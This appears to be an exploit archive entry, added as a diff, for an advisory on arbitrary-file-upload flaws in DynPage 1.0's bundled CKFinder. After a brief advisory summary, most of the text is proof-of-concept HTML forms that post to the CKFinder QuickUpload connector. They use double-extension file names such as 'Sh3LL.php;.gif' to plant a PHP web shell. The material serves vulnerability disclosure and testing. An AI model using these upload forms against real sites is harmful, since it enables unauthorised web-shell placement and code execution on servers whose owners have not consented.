@@ -1,0 +1,50 @@
+source: http://www.securityfocus.com/bid/53696/info
+
+DynPage is prone to multiple arbitrary-file-upload vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.
+
+DynPage 1.0 is vulnerable; other versions may also be affected. 
+
+########>>>>> Explo!T <<<<<<##################
+
+# Download : [http://www.dynpage.net/download/dynpage.zip]
+
+### [ Upload Sh3LL.php;.txt ] =>
+
+<form action="http://www.example.com/[path]/js/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Files" method="post" enctype="multipart/form-data" >
+<input name="Files" type="file" class="submit" size="80">
+<input type="submit" value="Upload !">
+</form>
+
+
+
+### [ Upload Sh3LL.php;.gif ;.jpeg ] =>
+
+<!-- p0c 1 -->
+<form action="http://www.example.com/[path]/js/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Images" method="post" enctype="multipart/form-data" >
+<input name="Images" type="file" class="submit" size="80">
+<input type="submit" value="Upload !">
+</form>
+
+<!-- p0c 2 -->
+<form action="http://www.example.com/[path]/js/ckfinder/ckfinder.html?Type=Images" method="post" enctype="multipart/form-data" >
+<input name="Images" type="file" class="submit" size="80">
+<input type="submit" value="Upload !">
+</form>
+
+
+### [ Upload Sh3LL.php;.swf ;.flv ] =>
+
+<!-- p0c 1 -->
+<form action="http://www.example.com/[path]/js/ckfinder/core/connector/php/connector.php?command=QuickUpload&type=Flash" method="post" enctype="multipart/form-data" >
+<input name="Images" type="file" class="submit" size="80">
+<input type="submit" value="Upload !">
+</form>
+
+<!-- p0c 2 -->
+<form action="http://www.example.com/[path]/js/ckfinder/ckfinder.html?Type=Flash" method="post" enctype="multipart/form-data" >
+<input name="Images" type="file" class="submit" size="80">
+<input type="submit" value="Upload !">
+</form>
+############# << ThE|End
